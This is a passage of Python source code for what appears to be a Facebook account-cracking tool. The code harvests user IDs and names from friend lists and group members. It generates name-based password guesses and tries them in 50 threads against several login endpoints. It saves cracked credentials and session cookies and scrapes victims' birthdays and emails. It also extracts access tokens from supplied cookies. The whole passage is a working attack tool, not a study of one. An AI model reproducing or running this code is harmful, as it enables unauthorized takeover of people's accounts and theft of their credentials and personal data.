            header = {"Host": "m.facebook.com","dnt": "1","upgrade-insecure-requests": "1","user-agent": dev(),"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-fetch-site": "none","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
            web = ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8", headers=header)
            data = {"lsd": re.search('name="lsd" value="(.*?)"', str(web.text)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(web.text)).group(1),"m_ts": re.search('name="m_ts" value="(.*?)"', str(web.text)).group(1),"li": re.search('name="li" value="(.*?)"', str(web.text)).group(1),"try_number": "0","unrecognized_tries": "0","email": ID,"pass": i,"login": "submit","bi_xrwh": "0"}
            cookie = dict(ses.cookies.get_dict())
            headers = {'authority': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-MM,en;q=0.9,my-MM;q=0.8,my;q=0.7,en-GB;q=0.6,en-US;q=0.5','cache-control': 'no-cache','dpr': '2','pragma': 'no-cache','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"','sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"','sec-ch-ua-mobile': '?1','sec-ch-ua-model': "",'sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"3.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': dev(),}
            ses.post("https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8", data=data, headers=headers,cookies=cookie, allow_redirects=True)
            if "c_user" in ses.cookies.get_dict():
                ok +=1
                cookie = ";".join([k+"="+v for k,v in ses.cookies.get_dict().items()])
                ID = ses.cookies.get_dict()["c_user"]
                open("ok.txt",'a').write(f"{ID}|{i}\n")
                open("cookie.txt",'a').write(cookie+"\n")
                req = ses.get("https://accountscenter.facebook.com/personal_info/birthday/", cookies={"cookie":cookie}).text
                try:
                    birthday = re.search('entrypoint=accounts_center","navigation_icon_platform_type":null,"navigation_row_subtitle":"(.*?)"', req).group(1)
                except AttributeError:
                    birthday = "None"
                try:
                    email = re.search('"navigation_row_subtitle":"(.*?)"',req).group(1).replace('\\u0040','@')
                except AttributeError:
                    email = "None"
                print(f"{green}[BIRTHDAY] {birthday}  \r")
                print(f"{green}[Email/Ph] {email}  \r")
                print(f"{green}[OK] {ID}|{i}  \r")
                line()
                break
            elif "checkpoint" in ses.cookies.get_dict():
                cp +=1
                ID = ses.cookies.get_dict()["checkpoint"][13:28]
                open("cp.txt",'a').write(f"{ID}|{i}\n")
                print(f"{red}[CP] {ID}|{i}  ")
                line()
                break
            else:
                continue
        loop+=1
    except err:
        time.sleep(5)


class File:
    def __init__(self):
        logo()
        self.ids = []
        xd = input(f"{gb}Put the id file {pi}: {wh}")
        try:
            ix = open(xd).read().splitlines()
            for a in ix:
                self.ids.append(a)
            self.choose_method()
        except FileNotFoundError:
            line()
            print(f"{rd}File Not Found ")
            time.sleep(3)
            File()
    
    def choose_method(self):
        logo()
        print(f"{wh}1 {pi}:{bl}Facebook Messenger Web")
        print(f"{wh}2 {pi}:{bl}Facebook Mobile Web")
        print(f"{wh}3 {pi}:{bl}Facebook Mbasic Web")
        print(f"{wh}4 {pi}:{bl}Facebook Alpha Web")
        print(f"{wh}5 {pi}:{bl}Facebook Ansyc Web")
        print(f"{wh}6 {pi}:{bl}Facebook Api Web")
        line()
        x = input(f"{gb}Put the login method {pi}: {wh}")
        ch = ["1","2","3","4","5","6"]
        if x in ch:
            self.choose_password_format(x)
        else:
            line()
            print(f"{rd}Make sure to choose method")
            time.sleep(3)
            self.choose_method()
    
    def choose_password_format(self, login_):
        logo()
        print(f"{wh}1 {pi}:{bl}Generate Manually Password[{gr}Good{bl}]")
        print(f"{wh}2 {pi}:{bl}Generate Auto Password[{gr}Recommand{bl}]")
        line()
        x = input(f"{gb}Put the password method {pi}: {wh}")
        if x == "1":
            self.choose_password_manually(login_)
        elif x == "2":
            self.choose_password_auto(login_)
        else:
            line()
            print(f"{rd}Make sure to choose method")
            time.sleep(3)
            self.choose_password_format(login_)
        
        
    def choose_password_auto(self, login_):
        logo()
        print(f"{wh}1 {pi}:{bl}Generate Password Possible[{gr}lowest{bl}]")
        print(f"{wh}2 {pi}:{bl}Generate Password Possible[{gr}Fewer{bl}]")
        print(f"{wh}3 {pi}:{bl}Generate Password Possible[{og}More{bl}]")
        line()
        x = input(f"{gb}Put the password format {pi}: {wh}")
        if x == "1":
            if login_ == "1":
                self.mx_lowest(self.ids, "Messenger")
            elif login_ == "2":
                self.mx_lowest(self.ids, "Mobile")
            elif login_ == "3":
                self.mx_lowest(self.ids, "Mbasic")
            elif login_ == "4":
                self.mx_lowest(self.ids, "Alpha")
            elif login_ == "5":
                self.mx_lowest(self.ids, "Ansyc")
            elif login_ == "6":
                self.mx_lowest(self.ids,"Api")
        elif x == "2":
            if login_ == "1":
                self.mx_fewer(self.ids, "Messenger")
            elif login_ == "2":
                self.mx_fewer(self.ids, "Mobile")
            elif login_ == "3":
                self.mx_fewer(self.ids, "Mbasic")
            elif login_ == "4":
                self.mx_fewer(self.ids, "Alpha")
            elif login_ == "5":
                self.mx_fewer(self.ids, "Ansyc")
            elif login_ == "6":
                self.mx_fewer(self.ids,"Api")
        elif x == "3":
            if login_ == "1":
                self.mx_more(self.ids, "Messenger")
            elif login_ == "2":
                self.mx_more(self.ids, "Mobile")
            elif login_ == "3":
                self.mx_more(self.ids, "Mbasic")
            elif login_ == "4":
                self.mx_more(self.ids, "Alpha")
            elif login_ == "5":
                self.mx_more(self.ids, "Ansyc")
            elif login_ == "6":
                self.mx_more(self.ids,"Api")
        else:
            line()
            print(f"{rd}Make sure to choose format")
            time.sleep(3)
            self.choose_password_auto(login_)
            
            
    def choose_password_manually(self, login_):
        logo()
        try:
            user_input_lim = int(input(f"{gb}Put the limit for password {pi}: {wh}"))
        except ValueError:
            line()
            print(f"{rd}Please put only integer number")
            line()
            print(f"{pi}Example-{bl} 10, 15, 18")
            time.sleep(4)
            self.choose_password_manually(login_)
        line()
        print(f"{pi}Note- {gr}Please sure to use given word and you can add any number behind the word ")
        line()
        print(f"{pi}Word-{bl} first, First, last, Last, firstlast, name, Name, unspace,")
        line()
        user_input_password = []
        for i in range(1, user_input_lim+1):
            pas = input(f"{gb}Put the password {pi}: {wh}")
            user_input_password.append(pas)
            line()
        if login_ == "1":
            self.mx_manually(self.ids, user_input_password, "Messenger")
        elif login_ == "2":
            self.mx_manually(self.ids, user_input_password, "Mobile")
        elif login_ == "3":
            self.mx_manually(self.ids, user_input_password, "Mbasic")
        elif login_ == "4":
            self.mx_manually(self.ids, user_input_password, "Alpha")
        elif login_ == "5":
            self.mx_manually(self.ids, user_input_password, "Ansyc")
        elif login_ == "6":
            self.mx_manually(self.ids, user_input_password, "Api")
    
    def mx_manually(self,ids, user_input_password, login_):
        logo()
        total = int(len(ids))
        with Th(max_workers=50) as mx:
            for i in ids:
                ID, Name = i.split("|")
                name = Name.lower()
                f = name.split(" ")[0]
                try:
                    l = name.split(" ")[1]
                except:
                    l = ""
                pwd = []
                for x in user_input_password:
                    string = ""
                    integer = ""
                    for i in x:
                        try:
                            int(i)
                        except ValueError:
                            string +=i
                        else:
                            integer +=i
                    if "first" == string:
                        pwd.append(f + integer)
                    elif "firstlast" == string:
                        pwd.append(f + l + integer)
                    elif "last" == string:
                        pwd.append(l + integer)
                    elif "last" == string:
                        pwd.append(l.title() + integer)
                    elif "unspace" == string:
                        pwd.append(name.replace(" ","") + integer)
                    elif "First" == string:
                        pwd.append(f.title() + integer)
                    elif "name" == string:
                        pwd.append(name + integer)
                    elif "Name" == integer:
                        pwd.append(Name + integer)
                if login_ == "Messenger":
                    mx.submit(Messenger, ID, pwd, total)
                elif login_ == "Mobile":
                    mx.submit(Mobile, ID, pwd, total)
                elif login_ == "Mbasic":
                    mx.submit(Mbasic, ID, pwd, total)
                elif login_ == "Alpha":
                    mx.submit(Alpha, ID, pwd, total)
                elif login_ == "Ansyc":
                    mx.submit(Ansyc, ID, pwd, total)
                elif login_ == "Api":
                    mx.submit(Api, ID, pwd, total)
        print('\r')
        line()
        print(f"{gr}Process Has Been Finished")
        line()


    def mx_lowest(self,ids, login_):
        logo()
        total = int(len(ids))
        with Th(max_workers=50) as mx:
            for i in ids:
                ID, Name = i.split("|")
                name = Name.lower()
                f = name.split(" ")[0]
                try:
                    l = name.split(" ")[1]
                except:
                    l = ""
                pwd = []
                pwd.append(Name)
                pwd.append(name)
                pwd.append(name.replace(" ",""))
                pwd.append(name.replace(" ","")+"123")
                pwd.append(name.replace(" ","")+"1234")
                pwd.append(name.replace(" ","")+"12345")
                pwd.append(f + l)
                pwd.append(f + "123")
                pwd.append(f + "1234")
                pwd.append(f + "12345")
                pwd.append(name + "123")
                pwd.append(name + "1234")
                pwd.append(name + "12345")
                if login_ == "Messenger":
                    mx.submit(Messenger, ID, pwd, total)
                elif login_ == "Mobile":
                    mx.submit(Mobile, ID, pwd, total)
                elif login_ == "Mbasic":
                    mx.submit(Mbasic, ID, pwd, total)
                elif login_ == "Alpha":
                    mx.submit(Alpha, ID, pwd, total)
                elif login_ == "Ansyc":
                    mx.submit(Ansyc, ID, pwd, total)
                elif login_ == "Api":
                    mx.submit(Api, ID, pwd, total)
        print('\r')
        line()
        print(f"{gr}Process Has Been Finished")
        line()
    

    def mx_fewer(self,ids, login_):
        logo()
        total = int(len(ids))
        with Th(max_workers=50) as mx:
            for i in ids:
                ID, Name = i.split("|")
                name = Name.lower()
                f = name.split(" ")[0]
                try:
                    l = name.split(" ")[1]
                except:
                    l = ""
                pwd = []
                pwd.append(Name)
                pwd.append(name)
                pwd.append(name.replace(" ",""))
                pwd.append(name.replace(" ","")+"123")
                pwd.append(name.replace(" ","")+"1234")
                pwd.append(name.replace(" ","")+"12345")
                pwd.append(f + l)
                pwd.append(f + "123")
                pwd.append(f + "1234")
                pwd.append(f + "12345")
                pwd.append(f + "2005")
                pwd.append(f + "2006")
                pwd.append(f + "2007")
                pwd.append(f + "2008")
                pwd.append(f + "2009")
                pwd.append(name + "123")
                pwd.append(name + "1234")
                pwd.append(name + "12345")
                if login_ == "Messenger":
                    mx.submit(Messenger, ID, pwd, total)
                elif login_ == "Mobile":
                    mx.submit(Mobile, ID, pwd, total)
                elif login_ == "Mbasic":
                    mx.submit(Mbasic, ID, pwd, total)
                elif login_ == "Alpha":
                    mx.submit(Alpha, ID, pwd, total)
                elif login_ == "Ansyc":
                    mx.submit(Ansyc, ID, pwd, total)
                elif login_ == "Api":
                    mx.submit(Api, ID, pwd, total)
        print('\r')
        line()
        print(f"{gr}Process Has Been Finished")
        line()

    def mx_more(self,ids, login_):
        logo()
        total = int(len(ids))
        with Th(max_workers=50) as mx:
            for i in ids:
                ID, Name = i.split("|")
                name = Name.lower()
                f = name.split(" ")[0]
                try:
                    l = name.split(" ")[1]
                except:
                    l = ""
                pwd = []
                pwd.append(Name)
                pwd.append(name)
                pwd.append(name.replace(" ",""))
                pwd.append(name.replace(" ","") + "123")
                pwd.append(name.replace(" ","") + "1234")
                pwd.append(name.replace(" ","") + "12345")
                pwd.append(f + l)
                pwd.append(f + l + "123")
                pwd.append(f + l + "1234")
                pwd.append(f + l + "12345")
                pwd.append(f + "123")
                pwd.append(f + "1234")
                pwd.append(f + "2005")
                pwd.append(f + "2004")
                pwd.append(f + "2003")
                pwd.append(f + "2002")
                pwd.append(f + "2001")
                pwd.append(f + "2000")
                pwd.append(name + "123")
                pwd.append(name + "1234")
                pwd.append(name + "12345")
                if login_ == "Messenger":
                    mx.submit(Messenger, ID, pwd, total)
                elif login_ == "Mobile":
                    mx.submit(Mobile, ID, pwd, total)
                elif login_ == "Mbasic":
                    mx.submit(Mbasic, ID, pwd, total)
                elif login_ == "Alpha":
                    mx.submit(Alpha, ID, pwd, total)
                elif login_ == "Ansyc":
                    mx.submit(Ansyc, ID, pwd, total)
                elif login_ == "Api":
                    mx.submit(Api, ID, pwd, total)
        print('\r')
        line()
        print(f"{gr}Process Has Been Finished")
        line()

getheaders =   {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9','Cache-Control':'max-age=0','Pragma':'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace','Sec-Ch-Prefers-Color-Scheme':'light','Sec-Ch-Ua':'','Sec-Ch-Ua-Full-Version-List':'','Sec-Ch-Ua-Mobile':'?0','Sec-Ch-Ua-Platform':'','Sec-Ch-Ua-Platform-Version':'','Sec-Fetch-Dest':'document','Sec-Fetch-Mode':'navigate','Sec-Fetch-Site':'same-origin','Sec-Fetch-User':'?1','Upgrade-Insecure-Requests':'1','User-Agent':"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",'Viewport-Width':'924'}

postheaders = {'Accept':'*/*','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9','Content-Type':'application/x-www-form-urlencoded','Origin':'https://www.facebook.com','Sec-Ch-Prefers-Color-Scheme':'dark','Sec-Ch-Ua':'','Sec-Ch-Ua-Full-Version-List':'','Sec-Ch-Ua-Mobile':'?0','Sec-Ch-Ua-Model':'','Sec-Ch-Ua-Platform':'','Sec-Ch-Ua-Platform-Version':'','Sec-Fetch-Dest':'empty','Sec-Fetch-Mode':'cors','Sec-Fetch-Site':'same-origin','User-Agent':"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"}

class dump_menu:
    def __init__(self):
        logo()
        self.loop = 0
        self.ses = requests.Session()
        try:
            self.cookie = {"cookie":open("Login/cookie.txt").read().strip()}
            self.language()
        except FileNotFoundError:
            print(f"{rd}Cookie Not Found")
            time.sleep(3)
            dump_menu()
        
    def req_file(self,x):
        logo()
        file_name = input(f"{gb}Put file for save dump id {pi}:{wh} ")
        try:
            open(file_name).read()
        except FileNotFoundError:
            print(f"{rd}File Not Found")
            time.sleep(3)
            dump_menu()
        if x == "1":
            self.public(file_name)
        elif x == "2":
            self.group(file_name)
    
    def language(self):
        ses = requests.Session()
        req = ses.get('https://www.facebook.com/profile.php', headers=getheaders, cookies=self.cookie, allow_redirects=True).text
        data = self.getdata(req)
        data.update({'fb_api_caller_class':'RelayModern','fb_api_req_friendly_name':'useCometLocaleSelectorLanguageChangeMutation','variables': json.dumps({"locale":"en_Us","referrer":"WWW_COMET_ACCOUNT_SETTINGS","fallback_locale":None}),'server_timestamps':True,'doc_id':'6451777188273168'})
        ses.post('https://www.facebook.com/api/graphql/', data=data, headers=postheaders, cookies=self.cookie)
        self.menu()

    def menu(self):
        logo()
        print(f"{wh}1 {pi}:{bl} ID dump from public user")
        print(f"{wh}2 {pi}:{bl} ID dump from public group")
        print(f"{wh}3 {pi}:{bl} Remove duplicate ID from file")
        line()
        x = input(f"{gb}Put the feature {pi}: {wh}")
        if x == "1":
            self.req_file(x)
        elif x == "2":
            self.req_file(x)
        elif x == "3":
            self.remove()
    
    def remove(self):
        logo()
        x = input(f"{gb}Put file to remove duplicate id {pi}:{wh} ")
        try:
            self.data = open(x,'r').read().splitlines()
        except FileNotFoundError:
            print(f"{rd}File Not Found")
            time.sleep(3)
            self.remove()
        os.remove(x)
        remove_data = list(dict.fromkeys(self.data))
        for i in remove_data:
            open(x,'a').write(i+"\n")
        line()
        print(f"{gr}Success to remove duplicate id")
        time.sleep(3)
        mainmenu()
    
    def req_id(self):
        get_uid = []
        line()
        print(f"{pi}Note- {gr}If you want to put more id you can use '{mw}|{gr}' between url (or) id")
        line()
        req = input(f"{gb}Put the url (or) id{pi} : {wh}")
        for i in req.split("|"):
            get_uid.append(i)
        return get_uid
    
    def convertUrl(self, url):
        convert = []
        for i in url:
            if i.startswith("https://www.facebook.com"):
                convert.append(i)
            elif i.startswith("https://m.facebook.com"):
                url = i.replace("m","www")
                convert.append(url)
            elif i.startswith("1000"):
                url = "https://www.facebook.com/profile.php?id="+i
                convert.append(url)
            elif i.startswith("6"):
                url = "https://www.facebook.com/profile.php?id="+i
                convert.append(url)
        return convert
    
    def getdata(self, req):
        av = re.search('"actorID":"(.*?)"',str(req)).group(1)
        __user = av
        __a = str(random.randrange(1,6))
        __hs = re.search('"haste_session":"(.*?)"',str(req)).group(1)
        __ccg = re.search('"connectionClass":"(.*?)"',str(req)).group(1)
        __rev = re.search('"__spin_r":(.*?),',str(req)).group(1)
        __spin_r = __rev
        __spin_b = re.search('"__spin_b":"(.*?)"',str(req)).group(1)
        __spin_t = re.search('"__spin_t":(.*?),',str(req)).group(1)
        __hsi = re.search('"hsi":"(.*?)"',str(req)).group(1)
        fb_dtsg = re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(req)).group(1)
        jazoest = re.search('jazoest=(.*?)"',str(req)).group(1)
        lsd = re.search('"LSD",\[\],{"token":"(.*?)"}',str(req)).group(1)
        data = {'av':av,'__user':__user,'__a':__a,'__hs':__hs,'dpr':'1.5','__ccg':__ccg,'__rev':__rev,'__spin_r':__spin_r,'__spin_b':__spin_b,'__spin_t':__spin_t,'__hsi':__hsi,'__comet_req':'15','fb_dtsg':fb_dtsg,'jazoest':jazoest,'lsd':lsd}
        return data

    def public(self, file_name):
        public_id = self.convertUrl(self.req_id())
        line()
        for url in public_id:
            self.public_data(url, file_name)
        print("\r")
        line()
        mainmenu()
    
    def public_data(self, url, file_name):
        try:
            req = self.ses.get(url, headers=getheaders, cookies=self.cookie).text
            data = self.getdata(req)
            allfr = re.search('{"tab_key":"friends_all","id":"(.*?)"}',str(req)).group(1)
            data.update({'fb_api_caller_class':'RelayModern','fb_api_req_friendly_name':'ProfileCometAppCollectionListRendererPaginationQuery','server_timestamps':True,'doc_id':'6709724792472394'})
            self.dumpFriendlist(data, cursor=None, allfr=allfr, file_name=file_name)
            sys.exit(allfr)
        except:
            pass
    
    def dumpFriendlist(self, data, cursor,allfr,file_name):
        try:
            data.update({'variables':json.dumps({"count":8,"cursor":cursor,"scale":1.5,"search":None,"id":allfr})})
            post = self.ses.post('https://www.facebook.com/api/graphql/', data=data, headers=postheaders, cookies=self.cookie).json()
            try:
                for x in post['data']['node']['pageItems']['edges']:
                    ID = x['node']['actions_renderer']['action']['client_handler']['profile_action']['restrictable_profile_owner']['id']
                    NAME = x['node']['actions_renderer']['action']['client_handler']['profile_action']['restrictable_profile_owner']['name']
                    open(file_name,'a').write(ID+"|"+NAME+"\n")
                    self.loop +=1
                    sys.stdout.write(f"\r{gb}Success dump ID [{og}{self.loop}{gb}]")
                    sys.stdout.flush()
            except Exception as e:
                pass
            if post['data']['node']['pageItems']['page_info']['has_next_page']:
                cursor = post['data']['node']['pageItems']['page_info']['end_cursor']
                self.dumpFriendlist(data, cursor=cursor, allfr=allfr, file_name=file_name)
        except Exception as e:
            pass
    
    def convertGroupUrl(self, url):
        convert = []
        for i in url:
            if i.startswith("https://www.facebook.com"):
                convert.append(i)
            elif i.startswith("https://m.facebook.com"):
                url = i.replace("m","www")
                convert.append(url)
            elif i.startswith("1"):
                url = "https://www.facebook.com/groups/"+i
                convert.append(url)
            elif i.startswith("2"):
                url = "https://www.facebook.com/groups/"+i
                convert.append(url)
            elif i.startswith("3"):
                url = "https://www.facebook.com/groups/"+i
                convert.append(url)
            elif i.startswith("4"):
                url = "https://www.facebook.com/groups/"+i
                convert.append(url)
            elif i.startswith("5"):
                url = "https://www.facebook.com/groups/"+i
                convert.append(url)
            elif i.startswith("6"):
                url = "https://www.facebook.com/groups/"+i
                convert.append(url)
            elif i.startswith("7"):
                url = "https://www.facebook.com/groups/"+i
                convert.append(url)
            elif i.startswith("8"):
                url = "https://www.facebook.com/groups/"+i
                convert.append(url)
            elif i.startswith("9"):
                url = "https://www.facebook.com/groups/"+i
                convert.append(url)
        return convert
        
    def group(self, file_name):
        group_url = self.convertGroupUrl(self.req_id())
        line()
        for url in group_url:
            self.setdata(url, file_name)
        print("\r")
        line()
        mainmenu()
        
    def setdata(self, url, file_name):
        try:
            req = self.ses.get(url, headers=getheaders, cookies=self.cookie, allow_redirects=True).text
            data = self.getdata(req)
            groupid = re.search('"groupID":"(.*?)"',str(req)).group(1)
            data.update({'fb_api_caller_class':'RelayModern','fb_api_req_friendly_name':'GroupsCometMembersPageNewMembersSectionRefetchQuery','server_timestamps':True,'doc_id':'6621621524622624'})
            self.dump_member(data, None, groupid, file_name)
        except:
            pass
        
    def dump_member(self, data, cursor, groupid, file_name):
        try:
            data.update({'variables':json.dumps({"count":10,"cursor":cursor,"groupID":groupid,"recruitingGroupFilterNonCompliant":False,"scale":1.5,"id":groupid})})
            post = self.ses.post('https://www.facebook.com/api/graphql/', data=data, headers=postheaders, cookies=self.cookie).json()
            for x in post['data']['node']['new_members']['edges']:
                try:
                    ID = x['node']['id']
                    NAME = x['node']['name']
                    open(file_name,'a').write(ID+"|"+NAME+"\n")
                    self.loop +=1
                    sys.stdout.write(f"\r{gb}Success dump ID [{og}{self.loop}{gb}]")
                    sys.stdout.flush()
                except:
                    pass
            if post['data']['node']['new_members']['page_info']['has_next_page']:
                cursor = post['data']['node']['new_members']['page_info']['end_cursor']
                self.dump_member(data, cursor, groupid, file_name)
        except Exception as e:
            pass





            
class Friend_List_Cracking:
    def __init__(self):
        self.dump_list = []
        self.me = []
        self.request_uid()
        self.cookie = {"cookie":open("Login/cookie.txt")}
        self.token_ = open("Login/token_")
        self.token__ =  open("Login/token_")
    
    def request_uid(self):
        logo()
        print(f"{red}[Note]: {green}Friends List Cracking Is Get To Crack Friends ID From {yellow}<Login Cookie User Account>{green} If You Want To Crack Another Account Friends List Put ' {yellow}change {green}' In Below")
        line()
        print(f"{wh}1 {pi}: {bl}Auto Get ID From Friends List{red}[Read The Note]")
        line()
        print(f"{wh}2 {pi}: {bl}Put Friends List ID Manually{red}[Read The Note]")
        line()
        x = input(f"{gr}Put the feature {pi}: {wh}")
        if x == "1":
            self.Friend_Auto_Crack()
            self.choose_method()
        elif x == "change" or x == "Change" or x == "ch" or x == "CHANGE" or x == "CH":
            if self._set_cookie():
                print(f"{green}Change Cookie Successful")
                time.sleep(3)
                self.request_uid()
    
    def req_cookie(self):
        logo()
        cookie = input(f"{gr}Put Cookie For Crack Friends List : {white}")
        data = self._check_cookie(cookie)
        if data is not None:
            return (True, data, cookie)
        else:
            return (False, None)
                
    def _set_cookie(self):
        _main_cookie = open("Login/cookie.txt").read().strip()
        _main_token_ = open("Login/token_").read().strip()
        __main_token__ = open("Login/token__").read().strip()
        datas = self.req_cookie()
        if datas[0]:
            self.cookie = {"cookie":datas[2]}
            self.token_ = datas[1][0]
            self.token__ = datas[1][1]
            return True
        else:
            return False
        
    def _check_cookie(self, cookiex):
        cookie = {"cookie":cookiex}
        ses = requests.Session()
        try:
            req = requests.get("https://www.facebook.com/profile.php?", cookies=cookie).text
            _actorID = re.search('"actorID":"(.*?)"', req).group(1)
            _actorName = re.search('"NAME":"(.*?)"', req).group(1)
            req1 = requests.get("https://business.facebook.com/business_locations", cookies=cookie).text
            _token = re.search('(\["EAAG\w+)',req1).group(1).replace('["',"")
            req2 = ses.get("https://www.facebook.com/adsmanager/manage/campaigns",cookies=cookie).text
            sets = re.search('act=(.*?)&nav_source',req2).group(1)
            url = f"https://www.facebook.com/adsmanager/manage/campaigns?act={sets}&nav_source=no_referrer"
            req3 = ses.get(url,cookies=cookie).text
            __token = re.search('accessToken="(.*?)"',req3).group(1)
            return (_token, __token)
        except AttributeError:
            return None
        except requests.exceptions.ConnectionError:
            raise(f"{red}[Warning]: {yellow}Poor Connection")
            sys.exit()
            
        
        
    def Friend_Auto_Crack(self):
        logo()
        store_ = []
        print(f"{red}[Note]: {green}Getting Friends ID From Login Cookie User Account")
        line()
        req  = requests.get("https://graph.facebook.com/me?fields=friends.fields(id,name,birthday)&access_token="+self.token__, cookies=self.cookie).json()
        for i in req["friends"]["data"]:
            self.me.append(i["id"])
            store_.append(i["id"]+"|"+i["name"])
        def Get_to_all():
            for a in self.me:
                req  = requests.get(f"https://graph.facebook.com/{a}?fields=friends.fields(id,name,birthday)&access_token="+self.token__, cookies=self.cookie).json()
                try:
                    for i in req["friends"]["data"]:
                        store_.append(i["id"]+"|"+i["name"])
                except KeyError:
                    continue
        rev = list(dict.fromkeys(store_))
        for i in rev:
            self.dump_list.append(i)
        sys.exit(rev)
        Get_to_all()
        
    def choose_method(self):
        logo()
        print(f"{wh}1 {pi}:{bl}Facebook Messenger Web")
        print(f"{wh}2 {pi}:{bl}Facebook Mobile Web")
        print(f"{wh}3 {pi}:{bl}Facebook Mbasic Web")
        print(f"{wh}4 {pi}:{bl}Facebook Alpha Web")
        print(f"{wh}5 {pi}:{bl}Facebook Ansyc Web")
        print(f"{wh}6 {pi}:{bl}Facebook Api Web")
        line()
        x = input(f"{gb}Put the login method {pi}: {wh}")
        ch = ["1","2","3","4","5","6"]
        if x in ch:
            self.choose_password_format(x)
        else:
            line()
            print(f"{rd}Make sure to choose method")
            time.sleep(3)
            self.choose_method()
    
    def choose_password_format(self, login_):
        logo()
        print(f"{wh}1 {pi}:{bl}Generate Manually Password[{gr}Good{bl}]")
        print(f"{wh}2 {pi}:{bl}Generate Auto Password[{gr}Recommand{bl}]")
        line()
        x = input(f"{gb}Put the password method {pi}: {wh}")
        if x == "1":
            self.choose_password_manually(login_)
        elif x == "2":
            self.choose_password_auto(login_)
        else:
            line()
            print(f"{rd}Make sure to choose method")
            time.sleep(3)
            self.choose_password_format(login_)
        
        
    def choose_password_auto(self, login_):
        logo()
        print(f"{wh}1 {pi}:{bl}Generate Password Possible[{gr}lowest{bl}]")
        print(f"{wh}2 {pi}:{bl}Generate Password Possible[{gr}Fewer{bl}]")
        print(f"{wh}3 {pi}:{bl}Generate Password Possible[{og}More{bl}]")
        line()
        x = input(f"{gb}Put the password format {pi}: {wh}")
        if x == "1":
            if login_ == "1":
                self.mx_lowest(self.dump_list, "Messenger")
            elif login_ == "2":
                self.mx_lowest(self.dump_list, "Mobile")
            elif login_ == "3":
                self.mx_lowest(self.dump_list, "Mbasic")
            elif login_ == "4":
                self.mx_lowest(self.dump_list, "Alpha")
            elif login_ == "5":
                self.mx_lowest(self.dump_list, "Ansyc")
            elif login_ == "6":
                self.mx_lowest(self.dump_list,"Api")
        elif x == "2":
            if login_ == "1":
                self.mx_fewer(self.dump_list, "Messenger")
            elif login_ == "2":
                self.mx_fewer(self.dump_list, "Mobile")
            elif login_ == "3":
                self.mx_fewer(self.dump_list, "Mbasic")
            elif login_ == "4":
                self.mx_fewer(self.dump_list, "Alpha")
            elif login_ == "5":
                self.mx_fewer(self.dump_list, "Ansyc")
            elif login_ == "6":
                self.mx_fewer(self.dump_list,"Api")
        elif x == "3":
            if login_ == "1":
                self.mx_more(self.dump_list, "Messenger")
            elif login_ == "2":
                self.mx_more(self.dump_list, "Mobile")
            elif login_ == "3":
                self.mx_more(self.dump_list, "Mbasic")
            elif login_ == "4":
                self.mx_more(self.dump_list, "Alpha")
            elif login_ == "5":
                self.mx_more(self.dump_list, "Ansyc")
            elif login_ == "6":
                self.mx_more(self.dump_list,"Api")
        else:
            line()
            print(f"{rd}Make sure to choose format")
            time.sleep(3)
            self.choose_password_auto(login_)
            
            
    def choose_password_manually(self, login_):
        logo()
        try:
            user_input_lim = int(input(f"{gb}Put the limit for password {pi}: {wh}"))
        except ValueError:
            line()
            print(f"{rd}Please put only integer number")
            line()
            print(f"{pi}Example-{bl} 10, 15, 18")
            time.sleep(4)
            self.choose_password_manually(login_)
        line()
        print(f"{red}[Note]: {gr}Please sure to use given word and you can add any number behind the word ")
        line()
        print(f"{green}[Word]:{bl} first, First, last, Last, firstlast, name, Name, unspace,")
        line()
        user_input_password = []
        for i in range(1, user_input_lim+1):
            pas = input(f"{gb}Put the password {pi}: {wh}")
            user_input_password.append(pas)
            line()
        if login_ == "1":
            self.mx_manually(self.dump_list, user_input_password, "Messenger")
        elif login_ == "2":
            self.mx_manually(self.dump_list, user_input_password, "Mobile")
        elif login_ == "3":
            self.mx_manually(self.dump_list, user_input_password, "Mbasic")
        elif login_ == "4":
            self.mx_manually(self.dump_list, user_input_password, "Alpha")
        elif login_ == "5":
            self.mx_manually(self.dump_list, user_input_password, "Ansyc")
        elif login_ == "6":
            self.mx_manually(self.dump_list, user_input_password, "Api")
    
    def mx_manually(self, ids, user_input_password, login_):
        logo()
        total = int(len(ids))
        with Th(max_workers=50) as mx:
            for i in ids:
                ID, Name = i.split("|")
                name = Name.lower()
                f = name.split(" ")[0]
                try:
                    l = name.split(" ")[1]
                except:
                    l = ""
                pwd = []
                for x in user_input_password:
                    string = ""
                    integer = ""
                    for i in x:
                        try:
                            int(i)
                        except ValueError:
                            string +=i
                        else:
                            integer +=i
                    if "first" == string:
